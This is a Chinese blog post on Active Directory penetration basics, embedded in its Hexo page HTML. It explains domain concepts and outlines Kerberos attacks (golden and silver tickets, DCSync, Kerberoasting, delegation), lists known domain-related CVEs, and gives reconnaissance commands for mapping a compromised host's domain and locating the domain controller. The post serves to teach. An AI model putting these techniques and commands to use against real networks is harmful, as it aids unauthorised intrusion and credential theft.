@@ -1,0 +1,440 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>域渗透基础 | cheng_xing's blog</title><meta name="author" content="cheng_xing"><meta name="copyright" content="cheng_xing"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="域渗透基础知识">
+<meta property="og:type" content="article">
+<meta property="og:title" content="域渗透基础">
+<meta property="og:url" content="http://example.com/2025/04/27/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:site_name" content="cheng_xing&#39;s blog">
+<meta property="og:description" content="域渗透基础知识">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/ltx.jpg">
+<meta property="article:published_time" content="2025-04-27T08:10:56.000Z">
+<meta property="article:modified_time" content="2025-05-18T18:03:42.122Z">
+<meta property="article:author" content="cheng_xing">
+<meta property="article:tag" content="域渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/ltx.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "域渗透基础",
+  "url": "http://example.com/2025/04/27/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/",
+  "image": "http://example.com/img/ltx.jpg",
+  "datePublished": "2025-04-27T08:10:56.000Z",
+  "dateModified": "2025-05-18T18:03:42.122Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "cheng_xing",
+      "url": "http://example.com/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/ltx.jpg"><link rel="canonical" href="http://example.com/2025/04/27/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '域渗透基础',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/hk.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">57</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/hk.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/ltx.jpg" alt="Logo"><span class="site-name">cheng_xing's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">域渗透基础</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">域渗透基础</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-04-27T08:10:56.000Z" title="发表于 2025-04-27 16:10:56">2025-04-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-05-18T18:03:42.122Z" title="更新于 2025-05-19 02:03:42">2025-05-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h2><h3 id="用户组与工作组"><a href="#用户组与工作组" class="headerlink" title="用户组与工作组"></a>用户组与工作组</h3><p>Windows系统存在一些为了特定用途而设置的用户，分别是：SYSTEM(系统)、Trustedinstaller(信任程序模块)、Everyone(所有人)、Creator Owner(创建者)等，这些特殊用户不属于任何用户组，是完全独立的账户。其中SYSTEM拥有整台计算机管理权限的账户，一般操作无法获取与它等价的权限。</p>
+<p>Windows系统内置了许多本地用户组，用于管理用户权限。只要用户账户加入到对应的用户组内，则用户账户也将具备对应用户组所拥有的权限。</p>
+<p>默认情况下，系统为用户分了7个组，并给每个组赋予不同的操作权限。这些组为：管理员组(Administrators)、高权限用户组(Power Users)、普通用户组(Users)、备份操作组(Backup Operators)、文件复制组(Replicator)、来宾用户组(Guests)、身份验证用户组(Authenticated Users)。</p>
+<p>工作组（Workgroup）是最常用最简单最普遍的资源管理模式，默认情况下计算机都在名为workgroup的工作组中。工作组模式比较松散，适合网络中计算机数量较少，不需要严格管理的情况。</p>
+<h3 id="域中用户"><a href="#域中用户" class="headerlink" title="域中用户"></a>域中用户</h3><p>域环境中的用户和本地用户的帐户不同，域用户帐户保存在活动目录中。在域环境中，一个域用户可以在域中的任何一台计算机上登录。在域中用户可以使用SID (Security Identifier) 来表明身份，用NTLM哈希或者Kerberos来验证身份。</p>
+<p>机器用户也被称作机器账号或计算机账号，所有加入域的主机都会有一个机器用户，机器用户的用户名以 $ 结尾。</p>
+<h3 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h3><p>组策略(Group Policy)用于控制用户帐户和计算机帐户的工作环境。组策略提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。其中本地的组策略(LGPO或LocalGPO)，可以在独立且非域的计算机上管理组策略对象。在域环境中的组策略通常被称作GPO(Group Policy Object)。</p>
+<h2 id="内网常用协议"><a href="#内网常用协议" class="headerlink" title="内网常用协议"></a>内网常用协议</h2><h3 id="NetBIOS"><a href="#NetBIOS" class="headerlink" title="NetBIOS"></a>NetBIOS</h3><p>NetBIOS（Network Basic Input&#x2F;Output System）是基于网络的交互协议，通常使用UDP 137、UDP 138、TCP 139等端口。Windows在安装TCP&#x2F;IP协议时会默认启用该协议，可能导致未设置权限校验的网络资源被访问。</p>
+<p>基于NetBIOS有NBNS (NetBIOS Name Service)服务，通常监听在UDP 137端口，该服务提供三种功能：将NetBIOS名称解析到IP、查询某一个NetBIOS节点的状态，注册&#x2F;释放一个NetBIOS名。</p>
+<p>可以使用 nbtstat 工具利用NetBIOS协议管理网络。</p>
+<h3 id="LLMNR"><a href="#LLMNR" class="headerlink" title="LLMNR"></a>LLMNR</h3><p>链路本地多播名称解析 (Link-Local Multicast Name Resolution, LLMNR)是一个基于DNS数据包格式的协议，IPv4和IPv6的主机可以通过此协议对同一本地链路上的主机执行名称解析。该协议在Windows Vista后被引入。 LLMNR监听UDP 5355端口，可以通过多播地址 224.0.0.252 (或 FF02:0:0:0:0:0:1:3) 访问。</p>
+<h3 id="mDNS"><a href="#mDNS" class="headerlink" title="mDNS"></a>mDNS</h3><p>mDNS (multicast DNS) 在Windows 10中被引入，监听UDP 5353端口，对应的多播地址为 224.0.0.251 ( FF02::FB ) 。mDNS主要实现了在没有传统DNS服务器的情况下使局域网内的主机实现相互发现和通信。</p>
+<h3 id="WPAD"><a href="#WPAD" class="headerlink" title="WPAD"></a>WPAD</h3><p>网络代理自动发现协议 (Web Proxy Auto-Discovery, WPAD) 是一种客户端使用DHCP和&#x2F;或DNS发现方法来定位一个配置文件URL的方法。在检测和下载配置文件后，它可以执行配置文件以测定特定URL应使用的代理。</p>
+<h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><p>域指将网络中多台计算机逻辑上组织到一起，进行集中管理的逻辑环境。域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器，域控制器中保存着整个域的用户帐号和安全数据库。</p>
+<h3 id="域结构"><a href="#域结构" class="headerlink" title="域结构"></a>域结构</h3><p>域树（Trees）由多个域组成，这些域共享同一表结构和配置，形成一个连续的命名空间（namespace）。</p>
+<p>林（Forests）是一个复杂的AD实例，由一个或数个域组成，每个域树都有自己唯一的名称空间。</p>
+<h3 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h3><p>ADDS的目录存储在域控制器(Domain Controller)内，一个域内可以有多台域控制器，每一个域控制器的地位几乎是平等的，有几乎相同的数据库。</p>
+<p>在一台域控制器添加一个用户账户后，这个账户会被自动复制到其他域控制器的数据库中。</p>
+<p>AD数据库有多主机复制模式（Multi-master Replication Model）和单主机复制模式（Sing-master Replication Model）。</p>
+<p>多主机模式可以直接更新任何一台域控制器内的AD对象，并将更新之后的对象复制到其他域控制器，大部分数据都是用多主机模式进行复制。</p>
+<p>单主机复制模式是指由一台被称作操作主机（Operations Master）的域控制器负责接收更改数据的请求，并将数据复制到其他的域控制器。</p>
+<h3 id="信任"><a href="#信任" class="headerlink" title="信任"></a>信任</h3><p>两个域之间需要创建信任关系，才可以访问对应域内的资源。</p>
+<p>Active Directory的信任方式可以分为以下几种：</p>
+<p>Tree-Root Trust-双向具有转移性<br>Parent-Child Trust具有转移性，双向行人<br>Forest Trust-如果两个林创建了信任关系，则林中所有的域都相互信任,两个林之间的信任关系无法自动扩展到其他林上<br>Realm Trust-ADDS域可以和非Windows系统的Kerberos域之间创建信任<br>External Trust-位于两个林内的域之间可以通过外部信任来创建信任关系<br>Shortcut Trust-可以缩短验证用户身份的时间</p>
+<h3 id="OU"><a href="#OU" class="headerlink" title="OU"></a>OU</h3><p>组织单位（Organization Unit，OU）是一个容器对象，将域中的对象组织成逻辑组，帮助管理员管理。OU包含用户、计算机、工作组、打印机、安全策略以及其他组织单位等。</p>
+<h2 id="Active-Directory"><a href="#Active-Directory" class="headerlink" title="Active Directory"></a>Active Directory</h2><p>活动目录 (Active Directory，AD) 是面向Windows Server的目录服务。Active Directory存储了有关网络对象的信息，并且让管理员和用户能够查找和使用这些信息。</p>
+<h3 id="ADDS"><a href="#ADDS" class="headerlink" title="ADDS"></a>ADDS</h3><p>Active Directory提供目录服务的组件被称作Active Directory域服务 (Active Directory Domain Services, ADDS) ，负责目录数据库的存储、增删改查等工作，可以用在多种局域网、广域网的场景中。</p>
+<p>从逻辑上看，ADDS的组件可以分为Partition、Schema、Domain、Domain tree、Forest、OU、Container。</p>
+<p>Partition也被称为naming context，是AD DS数据库的一部分。Schema是存储在 ADDS 中数据的定义。Container是为ADDS提供组织框架的对象。</p>
+<p>从实现上区分，ADDS可以分为Domain controller、Data store、Global catalog server、RODC (Read-only domain controller) 、Site、Subnet。</p>
+<p>每个域控制器都有完整的ADDS数据，每个域控都可以处理数据的修改并同步至其他的域控。</p>
+<p>域控会有一份数据拷贝 (Data store) ，默认存储在 C:\Windows\NTDS 目录下。</p>
+<p>Global catalog server是存储全局catalog的域控，catlog以只读的方式存储了一个multiple-domain forest的所有对象，用于加速搜索。</p>
+<h3 id="名称空间"><a href="#名称空间" class="headerlink" title="名称空间"></a>名称空间</h3><p>名称空间 (namespace) 是一块界定好的区域，在区域内可以用名称找到与之相关的信息。</p>
+<h3 id="对象与属性"><a href="#对象与属性" class="headerlink" title="对象与属性"></a>对象与属性</h3><p>ADDS内的资源都是以对象 (Object) 的形式存在的，对象通过属性 (Attrbute) 来描述其特征。</p>
+<h2 id="ADCS"><a href="#ADCS" class="headerlink" title="ADCS"></a>ADCS</h2><p>Active Directory 证书服务 (Active Directory Certificate Services，AD CS) 是微软用于实现 PKI 的服务。</p>
+<h3 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h3><p>ADCS 中的证书是 X.509 格式的数字签名文档，用于加密、签名或身份验证等。</p>
+<p>证书常用的属性由下述字段组成</p>
+<p>Subject：主题<br>Public Key：公钥<br>Extended Key Usages (EKUs)：扩展密钥，描述证书的对象标识符 (Object identifier, OID)<br>…</p>
+<p>常用的 EKU OID 包括：</p>
+<p>代码签名</p>
+<ul>
+<li>OID 1.3.6.1.5.5.7.3.3</li>
+<li>证书用于签署可执行代码</li>
+</ul>
+<p>加密文件系统</p>
+<ul>
+<li>OID 1.3.6.1.4.1.311.10.3.4</li>
+<li>证书用于加密文件系统</li>
+</ul>
+<p>安全电子邮件</p>
+<ul>
+<li>OID 1.3.6.1.5.5.7.3.4</li>
+<li>证书用于加密电子邮件</li>
+</ul>
+<p>客户端身份验证</p>
+<ul>
+<li>OID 1.3.6.1.5.5.7.3.2</li>
+</ul>
+<p>智能卡登录</p>
+<ul>
+<li>OID 1.3.6.1.4.1.311.20.2.2</li>
+</ul>
+<p>服务器认证</p>
+<ul>
+<li>OID 1.3.6.1.5.5.7.3.1</li>
+<li>证书用于识别服务器 (例如HTTPS 证书)</li>
+</ul>
+<h3 id="证书模板"><a href="#证书模板" class="headerlink" title="证书模板"></a>证书模板</h3><p>微软提供了证书模板的功能，方便在域内签发证书。证书模板是注册策略和预定义证书设置的集合，包含证书有效期、用途、申请者等信息。</p>
+<h3 id="证书注册"><a href="#证书注册" class="headerlink" title="证书注册"></a>证书注册</h3><p>证书可以通过以下几种方式注册：</p>
+<ul>
+<li>通过 Windows 客户端证书注册协议 (MS-WCCE)</li>
+<li>通过 ICertPassage 远程协议 (MS-ICPR)</li>
+<li>在 ADCS 开启了对应 Web 服务的情况下，使用 Web 服务注册</li>
+<li>在服务器安装了对应服务时，通过证书注册服务 (CES) 注册</li>
+<li>在服务器安装了对应服务时，使用网络设备注册服务</li>
+</ul>
+<h2 id="组策略-1"><a href="#组策略-1" class="headerlink" title="组策略"></a>组策略</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>组策略 (Group Policy, GP) 用于管理网络环境中的用户和设备，定义了系统管理员管理工作所要的各种模板组件。</p>
+<p>组策略有以下功能：</p>
+<ul>
+<li>管理注册表</li>
+<li>设置脚本</li>
+<li>重定向文件夹</li>
+<li>管理应用程序</li>
+<li>指定安全选项</li>
+</ul>
+<h3 id="常用概念"><a href="#常用概念" class="headerlink" title="常用概念"></a>常用概念</h3><p>组策略容器 (Group Policy Container，GPC)存储在活动目录中，包含GPO属性、配置信息和版本等。可以通过GPC来查找GPT。</p>
+<p>组策略模板 (Group Policy Template, GPT) 存储在域控中，包含所有的组策略信息。包括管理模板，安全，脚本，软件安装等。</p>
+<p>其中GPC中的信息量少、容量小，GPT中消息量较大、容量大，因此两个部分分开存放。防止活动目录中因存储了过多的数据而被影响性能。</p>
+<p>组策略对象 (Group Policy Object, GPO) 是包含多种Windows组策略设置的集合，存储在GPC和GPT中。</p>
+<h2 id="Kerberos的Windows实现"><a href="#Kerberos的Windows实现" class="headerlink" title="Kerberos的Windows实现"></a>Kerberos的Windows实现</h2><h3 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h3><p>服务主体名称 (ServicePrincipal Names, SPN) ，是服务实例(如HTTP、SMB等)的唯一标识符。</p>
+<p>SPN分为两种类型：一种是注册在活动目录的机器帐户下，当一个服务的权限为 Local System 或 Network Service，则SPN注册在机器帐户下。一种是注册在活动目录的域用户帐户下，当一个服务的权限为一个域用户，则SPN注册在域用户帐户下。</p>
+<h2 id="域内攻击思路"><a href="#域内攻击思路" class="headerlink" title="域内攻击思路"></a>域内攻击思路</h2><p>获取域控权限</p>
+<ul>
+<li>通过域控相关漏洞</li>
+<li>抓hash，尤其是域管理员、运维等高权限账号的哈希</li>
+</ul>
+<p>控制入域机器</p>
+<ul>
+<li>下发恶意策略控制</li>
+<li>获取域内用户凭证</li>
+<li>利用错误的域管理配置</li>
+<li>域内relay</li>
+</ul>
+<p>获取服务票据</p>
+<ul>
+<li>攻击Exchange等服务器</li>
+</ul>
+<h2 id="攻击类型"><a href="#攻击类型" class="headerlink" title="攻击类型"></a>攻击类型</h2><h3 id="黄金票据利用"><a href="#黄金票据利用" class="headerlink" title="黄金票据利用"></a>黄金票据利用</h3><p>在认证过程中，经过client与AS的通信会得到TGT，黄金票据（Golden Ticket）就是伪造票据授予票据（TGT），也被称为认证票据。</p>
+<p>黄金票据利用需要与DC通信，且需要获取krbtgt的hash，但是可以获取任何Kerbose服务权限。</p>
+<h3 id="白银票据利用"><a href="#白银票据利用" class="headerlink" title="白银票据利用"></a>白银票据利用</h3><p>白银票据（Silver Tickets）伪造利用的是Kerberos认证中的第三个步骤，在第三步的时候，client会带着ticket向server的某个服务进行请求，如果验证通过就可以访问server上的指定服务了，这里的ticket是基于client info、server session key、end time、server hash。这里client info已知，end time可以构造，server session key是TGS生成的，所以只要server的NTLM hash即可。银票伪造的是TGS，只能访问指定的服务。</p>
+<h3 id="DCSync-攻击"><a href="#DCSync-攻击" class="headerlink" title="DCSync 攻击"></a>DCSync 攻击</h3><p>内有多台域控服务器时，为了同步域控服务器的修改，微软提供了基于远程目录协议 DRSR 的同步机制。</p>
+<p>在多个域控服务器之间，每隔一段时间会有一次域数据的同步。由需要同步的域控服务器向其它服务器发送 GetNCChanges 请求，请求中包含需要同步的数据。数据量较多时，则重复这个过程。</p>
+<p>DCSync 就是使用这种机制进行域渗透的技术，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，在2015年添加到 mimikatz 的一个功能，可以导出域内所有用户的hash。</p>
+<p>这种方式需要满足以下任一一种权限：</p>
+<ul>
+<li>Administrators 组内的用户</li>
+<li>Domain Admins 组内的用户</li>
+<li>Enterprise Admins 组内的用户</li>
+<li>域控制器的计算机帐户</li>
+</ul>
+<p>或者拥有特定的几条 DACL:</p>
+<ul>
+<li>DS-Replication-Get-Changes</li>
+<li>DS-Replication-Get-Changes-All</li>
+<li>DS-Replication-Get-Changes-In-Filtered-Set</li>
+</ul>
+<p>当没有管理员用户，但是拥有 WriteDACL 权限时，可以写入上述 DACL 来完成 DCSync 。</p>
+<p>对于这种攻击，可以通过检测 GetNCChanges 发起者的方式，如果由非域控机器发起对应请求，则可以认为是 DCSync 攻击。</p>
+<h3 id="DCShadow-攻击"><a href="#DCShadow-攻击" class="headerlink" title="DCShadow 攻击"></a>DCShadow 攻击</h3><p>DCShadow是由来自法国的安全研究人员Benjamin Delpy和Vincent Le Toux在2018年的微软蓝帽（Blue Hat）大会上提出。</p>
+<p>DCShadow攻击指在Active Directory环境下创建一个恶意的域控制器，并用它来推送恶意对象。</p>
+<h3 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h3><p>哈希传递攻击（Pass-the-Hash，PTH）是通过传递NTLM哈希来认证的攻击方法，常用的工具有mimikatz等。</p>
+<h3 id="票据传递攻击"><a href="#票据传递攻击" class="headerlink" title="票据传递攻击"></a>票据传递攻击</h3><p>票据传递攻击（Pass-the-Ticket Attacks，PtT）是一种使用Kerberos票据代替明文密码或NTLM哈希的方法。PtT最常见的用途可能是使用黄金票据和白银票据，通过PtT访问主机相当简单。</p>
+<h3 id="Kerberoasting-Attacks"><a href="#Kerberoasting-Attacks" class="headerlink" title="Kerberoasting Attacks"></a>Kerberoasting Attacks</h3><p>Kerberoasting攻击由Tim Medin在2014 DerbyCon conference上 公开 。指域内的任何一台主机，都可以通过查询SPN，Kerberoasting即是向域内的所有服务请求TGS，然后进行暴力破解。</p>
+<h4 id="Roasting-AS-REP"><a href="#Roasting-AS-REP" class="headerlink" title="Roasting AS-REP"></a>Roasting AS-REP</h4><p>该攻击枚举域中不需要Kerberos预身份认证的帐户，向这些账户请求一条加密信息，并离线尝试获取到的账户哈希。该方式需要账户明确设置了 DONT_REQ_PREAUTH 。</p>
+<h3 id="Kerberos-Delegation-Attacks"><a href="#Kerberos-Delegation-Attacks" class="headerlink" title="Kerberos Delegation Attacks"></a>Kerberos Delegation Attacks</h3><p>在一个域中，A使用Kerberos身份验证访问服务B，B再使用A的身份去访问C，这个过程就可以理解为委派。委派主要分为非约束委派（Unconstrained delegation）和约束委派（Constrained delegation）两种，非约束委派可以访问域内任意其它服务，约束委派对认证做了限制不可以访问其他的服务。</p>
+<p>Kerberos Delegation（Kerberos委派）攻击分为非约束委派攻击和约束委派攻击。原理都是基于域内已经配置了委派的账户来获取其它账户的权限。</p>
+<h3 id="其他漏洞利用"><a href="#其他漏洞利用" class="headerlink" title="其他漏洞利用"></a>其他漏洞利用</h3><p>域用户提权 (CVE-2022-26923)<br>KDC bamboozling (CVE-2021-42287)<br>Name impersonation (CVE-2021-42278)<br>ProxyShell (CVE-2021-34473)<br>ProxyLogon (CVE-2021-26855)<br>PrintNightmare (CVE-2021-1675 &#x2F; CVE-2021-34527)<br>SMBGhost (CVE-2020-0796)<br>Zerologon (CVE-2020-1472)<br>NTLM Relay (CVE-2019-1040)<br>永恒之蓝 (MS17-010)<br>域用户提权 (MS14-068)<br>Gpp漏洞 (MS14-025)<br>SAMR协议漏洞 (MS14-016)</p>
+<h1 id="域渗透实践"><a href="#域渗透实践" class="headerlink" title="域渗透实践"></a>域渗透实践</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="确定环境"><a href="#确定环境" class="headerlink" title="确定环境"></a>确定环境</h3><p>在域内需要先确定被攻击主机的当前内网环境，如拓扑等信息，可以使用以下命令来快速定位。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">route print     # 查看路由信息</span><br><span class="line">arp -a  # 查看域中所有的设备</span><br><span class="line">ipconfig /all    # 判断当前是否在域环境中，看dns后缀和dns服务器</span><br><span class="line">ping &quot;域名&quot;</span><br><span class="line">net time /domain       #查看系统时间（判断主域）</span><br></pre></td></tr></table></figure>
+
+<h3 id="域内信息"><a href="#域内信息" class="headerlink" title="域内信息"></a>域内信息</h3><p>除了了解内网环境外，还可以通过命令来直接查看域的相关消息。</p>
+<h4 id="net-view"><a href="#net-view" class="headerlink" title="net view"></a>net view</h4><p>查看本地工作组&#x2F;域环境中的设备<br>查看域内在线主机，此时可以看⻅域内的两台机器，一台被攻陷的XZM-PC和域控AD。</p>
+<p>如果报错6118 &#x3D;&gt;<br>1、关闭防火墙；2、开启服务（Computer Browser、Server、Workstation）；3、重新打开CMD即可</p>
+<h4 id="net-view-domain"><a href="#net-view-domain" class="headerlink" title="net view &#x2F;domain"></a>net view &#x2F;domain</h4><p>查看当前有几个域。可以看见此时有一个MAO域。</p>
+<h4 id="net-user-domain"><a href="#net-user-domain" class="headerlink" title="net user &#x2F;domain"></a>net user &#x2F;domain</h4><p>查看域内用户，可以看见除了常见的管理员和来宾，域内还有一个krbtgt用户，这个用户非常重要，稍后会讲到。</p>
+<h4 id="net-group-domain"><a href="#net-group-domain" class="headerlink" title="net group &#x2F;domain"></a>net group &#x2F;domain</h4><p>查看域的组别信息<br>这里可以看见组较多，这里列出几个关键组了解一下。</p>
+<p>*Domain Admins 管理员组</p>
+<p>*Domain Computers 主机名</p>
+<p>*Domain Controllers 域控组</p>
+<p>*Enterprise Admins 企业级管理员</p>
+<p>可以通过 net group 组名 &#x2F;domain 来查看组内用户。</p>
+<h4 id="whoami-user"><a href="#whoami-user" class="headerlink" title="whoami &#x2F;user"></a>whoami &#x2F;user</h4><p>确定自身权限<br>500：administrator<br>501：guest<br>1000+：普通用户</p>
+<h4 id="net-group-“domain-controllers”-domain"><a href="#net-group-“domain-controllers”-domain" class="headerlink" title="net group “domain controllers” &#x2F;domain"></a>net group “domain controllers” &#x2F;domain</h4><p>查看域控管理员组的成员(域内高权限组)</p>
+<ul>
+<li>Domain Admins 域控管理员组(高权限)</li>
+<li>​Domain Computers 加入域内的主机成员<br>​- Domain Controllers 域控(高权限)</li>
+<li>Domain Users 域内普通用户<br>​- Enterprise Admins 企业管理员(高权限)</li>
+</ul>
+<h4 id="systeminfo-findstr-“KB”"><a href="#systeminfo-findstr-“KB”" class="headerlink" title="systeminfo | findstr “KB”"></a>systeminfo | findstr “KB”</h4><p>查看补丁信息</p>
+<h4 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h4><p>域控作为域的最高权限，自然是首要的攻击目标，可以通过刚才的一些已知的命令，来找到域控。</p>
+<p>通过 net user &#x2F;domain 来查看域内的账户；通过 net group “domain controllers” &#x2F;domain 来查看域控。自身权限可以使用 whoami &#x2F;user 命令快速查看。</p>
